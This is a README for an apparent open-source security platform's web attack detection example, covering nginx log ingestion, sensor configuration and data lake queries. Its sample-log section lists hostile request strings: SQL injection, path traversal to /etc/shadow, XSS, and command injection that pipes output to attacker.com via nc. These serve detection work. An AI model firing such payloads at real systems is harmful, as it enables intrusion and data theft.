# Web Attack Detection Use Case

This use case demonstrates how to use **Wildbox** to ingest, parse, and analyze web server access logs to detect common web application attacks in real-time.

## 🎯 Overview

This example shows the **log ingestion and parsing** capabilities of Wildbox by monitoring nginx access logs for suspicious patterns that indicate potential attacks such as:

- **SQL Injection** - Attempts to manipulate database queries
- **Cross-Site Scripting (XSS)** - Injection of malicious scripts
- **Path Traversal** - Attempts to access restricted files/directories
- **Command Injection** - Attempts to execute system commands
- **Brute Force Attacks** - Repeated login failures from the same IP
- **Security Scanner Activity** - Automated vulnerability scanning tools
- **Rate Limiting Violations** - Excessive requests from a single source
- **Local/Remote File Inclusion** - Attempts to include malicious files

## 🏗️ Architecture

```
┌─────────────────────┐
│   Web Server        │
│   (Nginx/Apache)    │
│                     │
│  access.log ────┐   │
│  error.log      │   │
└─────────────────┘   │
                      │
                      ▼
        ┌──────────────────────────┐
        │  Wildbox Sensor          │
        │  (open-security-sensor)  │
        │                          │
        │  • Log Forwarder         │
        │  • Pattern Parser        │
        │  • Event Enrichment      │
        └──────────────────────────┘
                      │
                      │ HTTPS/TLS
                      │
                      ▼
        ┌──────────────────────────┐
        │  Wildbox Data Lake       │
        │  (open-security-data)    │
        │                          │
        │  • Ingestion API         │
        │  • Event Storage         │
        │  • Search & Query        │
        └──────────────────────────┘
```

## 📋 Prerequisites

1. **Wildbox Platform Running**
   - Docker and Docker Compose installed
   - Wildbox services deployed (see main [QUICKSTART.md](../../docs/guides/quickstart.md))

2. **Web Server with Logs**
   - Nginx or Apache web server running
   - Access to log files (`/var/log/nginx/access.log`)
   - Appropriate read permissions

3. **Python 3.11+** (for the sensor)

## 🚀 Quick Start

### Step 1: Start Wildbox Platform

If you haven't already, start the Wildbox platform:

```bash
cd /path/to/wildbox
docker-compose up -d

# Wait for services to be healthy
docker-compose ps

# Verify Data Lake is running
curl http://localhost:8001/health
```

### Step 2: Configure the Sensor

Copy and customize the sensor configuration:

```bash
cd use-cases/web-attack-detection

# Copy the configuration
cp sensor-config/config.yaml /etc/security-sensor/config.yaml

# Edit the configuration
nano /etc/security-sensor/config.yaml
```

**Important settings to update:**

```yaml
data_lake:
  endpoint: "http://localhost:8001/api/v1/ingest"  # Your Data Lake endpoint
  api_key: "your-api-key-here"                     # Your API key

log_sources:
  - name: nginx_access
    type: file
    path: /var/log/nginx/access.log                # Path to your nginx logs
    format: nginx
    enabled: true
```

### Step 3: Test with Sample Logs

For testing without a real web server, you can use the provided sample logs:

```bash
# Create a test log directory
mkdir -p /tmp/wildbox-test/logs

# Copy sample logs
cp sample-logs/nginx-access.log /tmp/wildbox-test/logs/access.log

# Update sensor config to point to test logs
# Change path in config.yaml to: /tmp/wildbox-test/logs/access.log
```

### Step 4: Start the Sensor

#### Option A: Using Docker (Recommended)

```bash
# From the Wildbox root directory
cd ../../open-security-sensor

# Copy your config
cp ../use-cases/web-attack-detection/sensor-config/config.yaml ./config.yaml

# Update the config for Docker paths
# In config.yaml, change log path to: /host/var/log/nginx/access.log

# Start with Docker Compose
docker-compose up -d

# View logs
docker-compose logs -f sensor
```

#### Option B: Running Locally

```bash
# Install sensor dependencies
cd ../../open-security-sensor
pip install -r requirements.txt

# Run the sensor
python main.py --config /etc/security-sensor/config.yaml
```

### Step 5: Verify Log Ingestion

Check that logs are being ingested into the Data Lake:

```bash
# Check telemetry stats
curl http://localhost:8001/api/v1/telemetry/stats

# View recent events
curl http://localhost:8001/api/v1/telemetry/events?limit=10 | jq

# Check sensor status
curl http://localhost:8001/api/v1/sensors | jq
```

## 📊 Analyzing the Data

### View Ingested Events

Query the Data Lake API to see ingested log events:

```bash
# Get all telemetry events from the last hour
curl "http://localhost:8001/api/v1/telemetry/events?limit=100" | jq

# Filter by event type
curl "http://localhost:8001/api/v1/telemetry/events?event_type=log.nginx_access" | jq

# Get events from specific sensor
curl "http://localhost:8001/api/v1/telemetry/events?sensor_id=YOUR_SENSOR_ID" | jq
```

### Query Statistics

```bash
# Get statistics for the last 24 hours
curl "http://localhost:8001/api/v1/telemetry/stats?hours=24" | jq

# Get stats for specific sensor
curl "http://localhost:8001/api/v1/telemetry/stats?sensor_id=YOUR_SENSOR_ID&hours=24" | jq
```

### Example Response

When viewing events, you'll see structured data like:

```json
{
  "id": "uuid-here",
  "sensor_id": "web-server-sensor",
  "event_type": "log.nginx_access",
  "timestamp": "2025-11-09T10:05:01Z",
  "source_host": "web-server-01",
  "event_data": {
    "client_ip": "10.0.0.100",
    "request": "GET /products?id=1' OR '1'='1 HTTP/1.1",
    "status_code": 200,
    "user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36",
    "attack_type": "sql_injection"
  },
  "severity": "high",
  "tags": ["web-attack", "sql-injection"]
}
```

## 🔍 Attack Patterns in Sample Logs

The provided `sample-logs/nginx-access.log` contains examples of:

### 1. SQL Injection
```
GET /products?id=1' OR '1'='1 HTTP/1.1
GET /search?q='; DROP TABLE products;-- HTTP/1.1
```

### 2. Path Traversal
```
GET /../../../etc/passwd HTTP/1.1
GET /download?file=../../../../etc/shadow HTTP/1.1
```

### 3. Cross-Site Scripting (XSS)
```
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
GET /comment?text=<img src=x onerror=alert(1)> HTTP/1.1
```

### 4. Brute Force Login
```
POST /admin/login HTTP/1.1 (repeated 10+ times with 401 responses)
```

### 5. Security Scanners
```
User-Agent: sqlmap/1.7.2
User-Agent: Nikto/2.1.6
User-Agent: Acunetix Web Vulnerability Scanner
```

### 6. Command Injection
```
GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1
GET /exec?cmd=ls -la | nc attacker.com 1234 HTTP/1.1
```

## 🔧 Configuration Options

### Log Source Types

The sensor supports multiple log formats:

| Format | Description | Example Path |
|--------|-------------|--------------|
| `nginx` | Nginx combined access log format | `/var/log/nginx/access.log` |
| `apache` | Apache combined log format | `/var/log/apache2/access.log` |
| `syslog` | Standard syslog format | `/var/log/syslog` |
| `journald` | Systemd journal | N/A (uses journalctl) |

### Performance Tuning

Adjust these settings based on your log volume:

```yaml
performance:
  query_interval: 10      # How often to check for new logs (seconds)
  batch_size: 100         # Events per batch
  flush_interval: 30      # Force flush every N seconds
  max_queue_size: 1000    # Buffer size before dropping events
  worker_threads: 2       # Concurrent processing threads
```

### Log Filtering

You can add filters to reduce noise:

```yaml
log_sources:
  - name: nginx_access
    type: file
    path: /var/log/nginx/access.log
    format: nginx
    enabled: true
    filters:
      exclude_patterns:
        - "health-check"
        - "favicon.ico"
      exclude_status_codes:
        - 200
        - 304
```

## 📈 Next Steps

Once you have log ingestion working, you can extend this use case:

### 1. Add AI-Powered Analysis
Use **open-security-agents** to analyze patterns and detect anomalies:
- Behavioral analysis
- Threat classification
- Attack pattern recognition
- False positive reduction

### 2. Automated Response
Use **open-security-responder** to automatically respond to threats:
- Block malicious IPs at the firewall
- Add IPs to rate limiting lists
- Send alerts to Slack/email
- Trigger incident response playbooks

### 3. Dashboard Visualization
Use **open-security-dashboard** to visualize:
- Real-time attack maps
- Top attacking IPs
- Attack type distribution
- Timeline of events

### 4. Threat Intelligence Correlation
Correlate with **open-security-data** threat feeds:
- Check attacking IPs against known bad actor lists
- Enrich events with geolocation data
- Compare attack patterns with CVE databases

## 🐛 Troubleshooting

### Sensor Not Starting

```bash
# Check sensor logs
docker-compose logs sensor

# Verify configuration
docker-compose exec sensor cat /etc/security-sensor/config.yaml

# Test connection to Data Lake
docker-compose exec sensor curl http://data:8001/health
```

### No Events Being Ingested

```bash
# Verify log file exists and is readable
ls -la /var/log/nginx/access.log

# Check sensor has permission to read logs
docker-compose exec sensor cat /host/var/log/nginx/access.log

# Verify Data Lake is receiving data
curl http://localhost:8001/api/v1/telemetry/stats
```

### High Memory Usage

```bash
# Reduce batch size and queue size in config.yaml
performance:
  batch_size: 50
  max_queue_size: 500
  max_memory_mb: 128
```

## 📚 Additional Resources

- [Wildbox Documentation](https://www.wildbox.io)
- [Sensor Configuration Guide](../../open-security-sensor/README.md)
- [Data Lake API Documentation](http://localhost:8001/docs)
- [Log Forwarder Source Code](../../open-security-sensor/sensor/collectors/log_forwarder.py)

## 🤝 Contributing

Found an issue or want to add more attack patterns? Contributions are welcome!

1. Add new attack patterns to `sample-logs/nginx-access.log`
2. Document the attack type and detection method
3. Submit a pull request

## 📄 License

This use case example is part of Wildbox and is licensed under the MIT License.
